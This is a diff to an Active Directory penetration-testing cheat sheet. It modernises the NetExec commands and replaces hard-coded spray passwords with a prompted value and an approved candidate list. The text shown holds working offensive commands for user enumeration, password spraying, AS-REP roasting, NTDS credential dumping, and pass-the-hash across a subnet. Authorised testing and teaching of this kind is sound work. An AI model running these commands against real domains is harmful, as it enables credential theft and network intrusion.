@@ -32,7 +32,7 @@ ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local"
 
 # RID cycling — user enumeration without creds
 lookupsid.py guest@$DC_IP -no-pass
-netexec smb $DC_IP -u '' -p '' --rid-brute
+nxc smb "$DC_IP" -u '' -p '' --rid-brute
 
 # AS-REP Roast without creds (pre-auth disabled accounts)
 impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP
@@ -115,19 +115,23 @@ MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name STARTS WITH '
 ### 2.1 Password Spraying
 
 ```bash
-# CrackMapExec
-netexec smb $DC_IP -u users.txt -p 'Welcome123!' --no-bruteforce
-netexec smb $DC_IP -u users.txt -p 'Welcome123!' --continue-on-success
+# Supply one RoE-approved candidate without recording it in the note.
+read -rsp 'Spray candidate: ' SPRAY_PASS; printf '\n'
 
-# Kerbrute — quieter (Kerberos pre-auth vs. failed login events)
-kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123!'
+# NetExec
+nxc smb "$DC_IP" -u users.txt -p "$SPRAY_PASS" --no-bruteforce
+nxc smb "$DC_IP" -u users.txt -p "$SPRAY_PASS" --continue-on-success
+
+# Kerbrute
+kerbrute passwordspray --dc "$DC_IP" -d "$DOMAIN" users.txt "$SPRAY_PASS"
 
 # Rate-limited spray (respect lockout policy!)
-for pass in 'Password1' 'Welcome1' 'Spring2024!' 'Company2024!'; do
+while IFS= read -r pass; do
   echo "[*] Spraying: $pass"
-  netexec smb $DC_IP -u users.txt -p "$pass" --no-bruteforce 2>/dev/null | grep "+"
+  nxc smb "$DC_IP" -u users.txt -p "$pass" --no-bruteforce 2>/dev/null | grep "+"
   sleep 1800
-done
+done < approved-password-candidates.txt
+unset SPRAY_PASS
 ```
 
 ### 2.2 AS-REP Roasting
@@ -195,7 +199,7 @@ impacket-secretsdump -sam sam.hive -system system.hive -security security.hive L
 # Remote NTDS dump (requires DA)
 impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP
 impacket-secretsdump $DOMAIN/$USER@$DC_IP -hashes :NTLMHASH
-netexec smb $DC_IP -u $USER -p $PASS --ntds
+nxc smb "$DC_IP" -u "$USER" -p "$PASS" --ntds
 
 # VSS Shadow Copy (OPSEC-safe, no API calls)
 vssadmin create shadow /for=C:
@@ -224,7 +228,7 @@ impacket-psexec $DOMAIN/$USER@$TARGET -hashes :NTLMHASH
 evil-winrm -i $TARGET -u $USER -H NTLMHASH
 
 # Spray subnet
-netexec smb 192.168.10.0/24 -u Administrator -H NTLMHASH --local-auth
+nxc smb "$SUBNET" -u Administrator -H "$NTLM_HASH" --local-auth
 ```
 
 ### 4.2 Pass-the-Ticket
@@ -488,7 +492,7 @@ misc::skeleton
 | Goal | Command |
 |------|---------|
 | User enum (no creds) | `kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt` |
-| Password spray | `netexec smb $DC_IP -u users.txt -p Pass --no-bruteforce` |
+| Password spray | `nxc smb "$DC_IP" -u users.txt -p "$SPRAY_PASS" --no-bruteforce` |
 | AS-REP Roast | `GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP` |
 | Kerberoast | `GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request` |
 | BloodHound | `bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC_IP -c All` |
